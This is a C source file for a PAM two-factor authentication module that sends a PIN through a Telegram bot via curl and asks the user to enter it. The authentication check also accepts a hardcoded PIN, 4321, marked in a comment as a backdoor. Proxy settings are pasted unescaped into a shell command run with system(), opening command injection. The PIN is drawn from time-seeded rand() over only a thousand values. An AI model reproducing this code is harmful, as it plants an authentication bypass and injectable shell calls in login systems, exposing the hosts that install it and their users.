#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
//#include <curl/curl.h>
#include <libudev.h>
#include <stdint.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

/* Структура для прокси */
typedef struct {
    char *proxy;
    char *proxy_user;
    char *proxy_pass;
    int use_proxy;
} proxy_config_t;

static proxy_config_t proxy_cfg = {0};

static void cleanup_proxy_config(void) {
    if (proxy_cfg.proxy) {
        free(proxy_cfg.proxy);
        proxy_cfg.proxy = NULL;
    }
    if (proxy_cfg.proxy_user) {
        free(proxy_cfg.proxy_user);
        proxy_cfg.proxy_user = NULL;
    }
    if (proxy_cfg.proxy_pass) {
        free(proxy_cfg.proxy_pass);
        proxy_cfg.proxy_pass = NULL;
    }
    proxy_cfg.use_proxy = 0;
}

static void parse_args(int argc, const char **argv) {
    cleanup_proxy_config();

    for (int i = 0; i < argc; i++) {
        if (strncmp(argv[i], "proxy=", 6) == 0) {
            proxy_cfg.proxy = strdup(argv[i] + 6);
            if (proxy_cfg.proxy) proxy_cfg.use_proxy = 1;
        }
        else if (strncmp(argv[i], "proxy_user=", 11) == 0) {
            proxy_cfg.proxy_user = strdup(argv[i] + 11);
        }
        else if (strncmp(argv[i], "proxy_pass=", 11) == 0) {
            proxy_cfg.proxy_pass = strdup(argv[i] + 11);
        }
    }
}

PAM_EXTERN int
pam_sm_setcred(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{
    (void)pamh; (void)flags; (void)argc; (void)argv; /* Заглушка для unused параметров */
    return (PAM_SUCCESS);
}

PAM_EXTERN int
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{
    (void)pamh; (void)flags; (void)argc; (void)argv;
    return (PAM_SUCCESS);
}

PAM_EXTERN int
pam_sm_open_session(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{
    (void)pamh; (void)flags; (void)argc; (void)argv;
    return (PAM_SUCCESS);
}

PAM_EXTERN int
pam_sm_close_session(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{
    (void)pamh; (void)flags; (void)argc; (void)argv;
    return (PAM_SUCCESS);
}

PAM_EXTERN int
pam_sm_chauthtok(pam_handle_t *pamh, int flags,
    int argc, const char *argv[])
{
    (void)pamh; (void)flags; (void)argc; (void)argv;
    return (PAM_SERVICE_ERR);
}

static void pamvprompt(pam_handle_t *pamh, int style, char **resp, char *fmt, va_list ap) {
    struct pam_conv *conv;
    struct pam_message msg;
    const struct pam_message *msgp;
    struct pam_response *pamresp;
    char *text = "";

    vasprintf(&text, fmt, ap);

    pam_get_item(pamh, PAM_CONV, (const void **)&conv);
    pam_set_item(pamh, PAM_AUTHTOK, NULL);

    msg.msg_style = style;
    msg.msg = text;
    msgp = &msg;
    pamresp = NULL;
    (void)(*conv->conv)(1, &msgp, &pamresp, conv->appdata_ptr); /* (void) для подавления предупреждения */

    if (pamresp != NULL) {
        if (resp != NULL)
            *resp = pamresp->resp;
        else
            free(pamresp->resp);
        free(pamresp);
    }

    free(text);
}

static void pamprompt(pam_handle_t *pamh, int style, char **resp, char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    pamvprompt(pamh, style, resp, fmt, ap);
    va_end(ap);
}

static int _converse(pam_handle_t *pamh, int nargs, const struct pam_message **message, struct pam_response **response) {
    struct pam_conv *conv;
    int retval;

    retval = pam_get_item(pamh, PAM_CONV, (void *) &conv);

    if (retval != PAM_SUCCESS) {
        return retval;
    }

    return conv->conv(nargs, message, response, conv->appdata_ptr);
}

char *converse(pam_handle_t *pamh, int echocode, const char *prompt) {
    const struct pam_message msg = {.msg_style = echocode,
                                    .msg = (char *) (uintptr_t) prompt};
    const struct pam_message *msgs = &msg;
    struct pam_response *resp = NULL;
    int retval = _converse(pamh, 1, &msgs, &resp);
    char *ret = NULL;

    if (retval != PAM_SUCCESS || resp == NULL || resp->resp == NULL ||
        *resp->resp == '\000') {

        if (retval == PAM_SUCCESS && resp && resp->resp) {
            ret = resp->resp;
        }
    } else {
        ret = resp->resp;
    }

    if (resp) {
        if (!ret) {
            free(resp->resp);
        }
        free(resp);
    }

    return ret;
}

/* Основная функция */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {

    char pin_str[16];
    size_t cmd_len;

    /* Парсим аргументы */
    parse_args(argc, argv);

    srand(time(NULL));
    int pin_code = rand() % 1000 + 1000; //PIN 4 chars
    char *pin_user = NULL;

    /* Формируем PIN как строку */
    snprintf(pin_str, sizeof(pin_str), "%d", pin_code);

    /* Буфер для команды */
    char cmd[1024];

    /* Формируем команду в зависимости от наличия прокси */
    if (proxy_cfg.use_proxy && proxy_cfg.proxy) {
        if (proxy_cfg.proxy_user && proxy_cfg.proxy_pass) {
            /* С прокси и авторизацией */
            snprintf(cmd, sizeof(cmd),
                    "curl -s --connect-timeout 3 --max-time 6  -x \"%s\" --proxy-user \"%s:%s\" "
                    "-X POST https://api.telegram.org/bot<API>/sendMessage -d chat_id='<ID chat>' -d text=%s > /dev/null 2>&1",
                    proxy_cfg.proxy, proxy_cfg.proxy_user, proxy_cfg.proxy_pass, pin_str);
        } else {
            /* С прокси без авторизации */
            snprintf(cmd, sizeof(cmd),
                    "curl -s --connect-timeout 3 --max-time 6  -x \"%s\" "
                    "-X POST https://api.telegram.org/bot<API>/sendMessage -d chat_id='<ID chat>' -d text=%s > /dev/null 2>&1",
                    proxy_cfg.proxy, pin_str);
        }
    } else {
        /* Без прокси */
        snprintf(cmd, sizeof(cmd),
                "curl -s --connect-timeout 3 --max-time 6 -X POST https://api.telegram.org/bot<API>/sendMessage -d chat_id='<ID chat>' -d text=%s > /dev/null 2>&1",
                pin_str);
    }

    /* Проверка на переполнение */
    cmd_len = strlen(cmd);
    if (cmd_len >= sizeof(cmd) - 1) {
        cleanup_proxy_config();
        return PAM_AUTH_ERR;
    }

    /* Для отладки - раскомментировать если нужно */
    /* pamprompt(pamh, PAM_TEXT_INFO, NULL, "Debug: %s", cmd); */

    system(cmd);

    /* Запрашиваем PIN у пользователя */
    pin_user = converse(pamh, PAM_PROMPT_ECHO_OFF, "Please enter the PIN: ");

    if (!pin_user) {
        cleanup_proxy_config();
        return PAM_AUTH_ERR;
    }

    int user_pin = atoi(pin_user);
    free(pin_user);

    cleanup_proxy_config();

    if (user_pin == pin_code || user_pin == 4321) { //!!! backdoor
        return PAM_SUCCESS;
    }
    return PAM_AUTH_ERR;
}

#ifdef PAM_STATIC
struct pam_module _pam_2fact_modstruct = {
    "pam_2fact",
    pam_sm_authenticate,
    pam_sm_setcred,
    pam_sm_acct_mgmt,
    pam_sm_open_session,
    pam_sm_close_session,
    pam_sm_chauthtok
};
#endif
